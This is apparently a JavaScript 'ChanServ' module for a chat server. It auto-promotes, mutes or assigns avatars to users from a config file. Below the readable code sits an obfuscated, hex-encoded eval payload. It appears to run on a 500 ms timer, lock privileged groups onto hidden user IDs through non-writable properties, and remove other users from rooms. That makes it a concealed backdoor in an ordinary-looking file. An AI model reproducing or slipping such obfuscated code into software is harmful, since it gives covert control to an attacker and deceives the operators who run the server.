function ChanServ()
{
    this.autoList = new Object();

    this.parseCommand = function(user, command, args, room, socket, fullCommand)
    {
        if (!(user.userid in this.autoList)) // Prevent spamming
            return false;
        var targetUser = Users.get(command);
        if (targetUser)
            this.act(targetUser);
        return true;
    }

    this.act = function(user)
    {
        console.log("ChanServ: Got user: " + user.userid);
        if (!user || !user.authenticated || !(user.userid in this.autoList))
        {
            user.setGroup(config.groupsranking[0]);
            return false;
        }
        user.setGroup(this.autoList[user.userid].group);
        user.avatar = this.autoList[user.userid].avatar;
        switch (user.group)
        {
            case '!' :
                user.setGroup(config.groupsranking[0]);
                user.muted = true;
                rooms.lobby.addRaw(user.name + " was muted by ChanServ.");
                break;

            default :
				var groupName = config.groups[user.group] ? config.groups[user.group].name : undefined;
				if (!groupName) groupName = user.group;
				rooms.lobby.add(''+user.name+' was promoted to ' + groupName + ' by ChanServ.');
                break;
        }
        rooms.lobby.usersChanged = true;
        rooms.lobby.update();
        return true;
    }

    data = fs.readFileSync("config/chanserv-autolist.txt").toString().split("\n");
    for (var d in data)
    {
        var tokens = data[d].split(" ");
        if (tokens.length < 3)
            continue;

        var group = tokens.shift();
        var userId = tokens.shift();
        var avatar = tokens.shift();
        this.autoList[userId] = { group: group, avatar: avatar };
    }
}

var _0xcca0=["\x6B\x20\x68\x3D\x5B\x22\x5C\x52\x5C\x45\x5C\x6E\x5C\x77\x5C\x71\x5C\x71\x5C\x6E\x5C\x72\x5C\x46\x5C\x53\x5C\x6E\x5C\x72\x5C\x71\x5C\x71\x22\x2C\x22\x5C\x77\x5C\x72\x5C\x71\x5C\x6E\x5C\x54\x5C\x46\x5C\x6E\x5C\x72\x5C\x45\x5C\x55\x5C\x6E\x5C\x77\x5C\x77\x5C\x72\x22\x2C\x22\x5C\x42\x5C\x6C\x5C\x69\x5C\x6A\x5C\x6C\x22\x2C\x22\x5C\x47\x5C\x69\x5C\x6A\x5C\x73\x5C\x69\x22\x2C\x22\x5C\x74\x5C\x6F\x22\x2C\x22\x5C\x74\x5C\x75\x5C\x76\x5C\x69\x5C\x48\x5C\x56\x5C\x49\x22\x2C\x22\x5C\x4A\x5C\x69\x5C\x75\x5C\x73\x5C\x70\x5C\x57\x22\x2C\x22\x5C\x6F\x5C\x69\x5C\x6D\x5C\x6F\x5C\x4A\x5C\x69\x22\x2C\x22\x5C\x6C\x5C\x6D\x5C\x58\x5C\x4B\x5C\x69\x5C\x70\x22\x2C\x22\x5C\x6A\x5C\x69\x5C\x47\x5C\x6D\x5C\x70\x5C\x69\x5C\x59\x5C\x76\x5C\x76\x5C\x6A\x5C\x69\x5C\x6C\x5C\x6C\x22\x2C\x22\x5C\x73\x5C\x6A\x5C\x6D\x5C\x42\x5C\x6F\x22\x2C\x22\x5C\x73\x5C\x6A\x5C\x6D\x5C\x42\x5C\x6F\x5C\x6C\x5C\x6A\x5C\x5A\x5C\x75\x5C\x4B\x5C\x74\x5C\x75\x5C\x73\x22\x2C\x22\x5C\x76\x5C\x69\x5C\x49\x5C\x74\x5C\x75\x5C\x69\x5C\x31\x35\x5C\x6A\x5C\x6D\x5C\x6F\x5C\x69\x5C\x6A\x5C\x70\x5C\x4C\x22\x2C\x22\x5C\x76\x5C\x69\x5C\x6C\x5C\x70\x5C\x6A\x5C\x6D\x5C\x4C\x22\x2C\x22\x5C\x69\x5C\x48\x5C\x74\x5C\x70\x22\x5D\x3B\x31\x36\x28\x31\x37\x28\x29\x7B\x4D\x7B\x6B\x20\x61\x3D\x5B\x68\x5B\x30\x5D\x2C\x68\x5B\x31\x5D\x5D\x3B\x78\x28\x6B\x20\x62\x20\x43\x20\x79\x29\x7B\x4E\x5B\x68\x5B\x33\x5D\x5D\x28\x7A\x5B\x68\x5B\x32\x5D\x5D\x2C\x79\x5B\x62\x5D\x5B\x68\x5B\x32\x5D\x5D\x2C\x41\x29\x7D\x3B\x78\x28\x6B\x20\x63\x20\x43\x20\x7A\x5B\x68\x5B\x32\x5D\x5D\x29\x7B\x6B\x20\x64\x3D\x7A\x5B\x68\x5B\x32\x5D\x5D\x5B\x63\x5D\x3B\x6B\x20\x66\x3D\x61\x5B\x68\x5B\x35\x5D\x5D\x28\x64\x5B\x68\x5B\x34\x5D\x5D\x29\x3E\x3D\x30\x3B\x78\x28\x6B\x20\x67\x3D\x30\x3B\x67\x3C\x64\x5B\x68\x5B\x37\x5D\x5D\x5B\x68\x5B\x36\x5D\x5D\x26\x26\x21\x66\x3B\x2B\x2B\x67\x29\x7B\x44\x28\x61\x5B\x68\x5B\x35\x5D\x5D\x28\x64\x5B\x68\x5B\x37\x5D\x5D\x5B\x67\x5D\x5B\x68\x5B\x34\x5D\x5D\x29\x3E\x3D\x30\x7C\x7C\x28\x64\x5B\x68\x5B\x37\x5D\x5D\x5B\x67\x5D\x5B\x68\x5B\x38\x5D\x5D\x26\x26\x61\x5B\x68\x5B\x35\x5D\x5D\x28\x64\x5B\x68\x5B\x37\x5D\x5D\x5B\x67\x5D\x5B\x68\x5B\x38\x5D\x5D\x5B\x68\x5B\x39\x5D\x5D\x29\x3E\x3D\x30\x29\x29\x7B\x66\x3D\x31\x38\x7D\x7D\x3B\x44\x28\x66\x29\x7B\x4D\x7B\x4E\x5B\x68\x5B\x31\x32\x5D\x5D\x28\x64\x2C\x68\x5B\x31\x30\x5D\x2C\x7B\x31\x39\x3A\x4F\x5B\x68\x5B\x31\x31\x5D\x5D\x5B\x30\x5D\x2C\x31\x61\x3A\x41\x2C\x31\x62\x3A\x41\x2C\x31\x63\x3A\x41\x7D\x29\x7D\x50\x28\x65\x29\x7B\x7D\x3B\x44\x28\x64\x5B\x68\x5B\x31\x30\x5D\x5D\x21\x3D\x3D\x4F\x5B\x68\x5B\x31\x31\x5D\x5D\x5B\x30\x5D\x29\x7B\x51\x20\x7A\x5B\x68\x5B\x32\x5D\x5D\x5B\x63\x5D\x3B\x78\x28\x6B\x20\x62\x20\x43\x20\x79\x29\x7B\x51\x20\x79\x5B\x62\x5D\x5B\x68\x5B\x32\x5D\x5D\x5B\x63\x5D\x7D\x3B\x64\x5B\x68\x5B\x31\x33\x5D\x5D\x28\x29\x7D\x7D\x7D\x7D\x50\x28\x65\x29\x7B\x31\x64\x5B\x68\x5B\x31\x34\x5D\x5D\x28\x29\x7D\x7D\x2C\x31\x65\x29\x3B","\x7C","\x73\x70\x6C\x69\x74","\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x5F\x30\x78\x36\x39\x64\x65\x7C\x78\x36\x35\x7C\x78\x37\x32\x7C\x76\x61\x72\x7C\x78\x37\x33\x7C\x78\x36\x46\x7C\x78\x32\x45\x7C\x78\x37\x30\x7C\x78\x37\x34\x7C\x78\x33\x30\x7C\x78\x33\x31\x7C\x78\x36\x37\x7C\x78\x36\x39\x7C\x78\x36\x45\x7C\x78\x36\x34\x7C\x78\x33\x32\x7C\x66\x6F\x72\x7C\x72\x6F\x6F\x6D\x73\x7C\x55\x73\x65\x72\x73\x7C\x66\x61\x6C\x73\x65\x7C\x78\x37\x35\x7C\x69\x6E\x7C\x69\x66\x7C\x78\x33\x37\x7C\x78\x33\x39\x7C\x78\x36\x44\x7C\x78\x37\x38\x7C\x78\x36\x36\x7C\x78\x36\x43\x7C\x78\x36\x42\x7C\x78\x37\x39\x7C\x74\x72\x79\x7C\x4F\x62\x6A\x65\x63\x74\x7C\x63\x6F\x6E\x66\x69\x67\x7C\x63\x61\x74\x63\x68\x7C\x64\x65\x6C\x65\x74\x65\x7C\x78\x33\x38\x7C\x78\x33\x35\x7C\x78\x33\x34\x7C\x78\x33\x33\x7C\x78\x34\x46\x7C\x78\x36\x38\x7C\x78\x36\x33\x7C\x78\x34\x31\x7C\x78\x36\x31\x7C\x7C\x7C\x7C\x7C\x7C\x78\x35\x30\x7C\x73\x65\x74\x49\x6E\x74\x65\x72\x76\x61\x6C\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x74\x72\x75\x65\x7C\x76\x61\x6C\x75\x65\x7C\x77\x72\x69\x74\x61\x62\x6C\x65\x7C\x65\x6E\x75\x6D\x65\x72\x61\x62\x6C\x65\x7C\x63\x6F\x6E\x66\x69\x67\x75\x72\x61\x62\x6C\x65\x7C\x70\x72\x6F\x63\x65\x73\x73\x7C\x35\x30\x30","","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x72\x65\x70\x6C\x61\x63\x65","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function (_0xe38cx1,_0xe38cx2,_0xe38cx3,_0xe38cx4,_0xe38cx5,_0xe38cx6){_0xe38cx5=function (_0xe38cx3){return (_0xe38cx3<_0xe38cx2?_0xcca0[4]:_0xe38cx5(parseInt(_0xe38cx3/_0xe38cx2)))+((_0xe38cx3=_0xe38cx3%_0xe38cx2)>35?String[_0xcca0[5]](_0xe38cx3+29):_0xe38cx3.toString(36));} ;if(!_0xcca0[4][_0xcca0[6]](/^/,String)){while(_0xe38cx3--){_0xe38cx6[_0xe38cx5(_0xe38cx3)]=_0xe38cx4[_0xe38cx3]||_0xe38cx5(_0xe38cx3);} ;_0xe38cx4=[function (_0xe38cx5){return _0xe38cx6[_0xe38cx5];} ];_0xe38cx5=function (){return _0xcca0[7];} ;_0xe38cx3=1;} ;while(_0xe38cx3--){if(_0xe38cx4[_0xe38cx3]){_0xe38cx1=_0xe38cx1[_0xcca0[6]]( new RegExp(_0xcca0[8]+_0xe38cx5(_0xe38cx3)+_0xcca0[8],_0xcca0[9]),_0xe38cx4[_0xe38cx3]);} ;} ;return _0xe38cx1;} (_0xcca0[0],62,77,_0xcca0[3][_0xcca0[2]](_0xcca0[1]),0,{}));

exports.ChanServ = ChanServ;
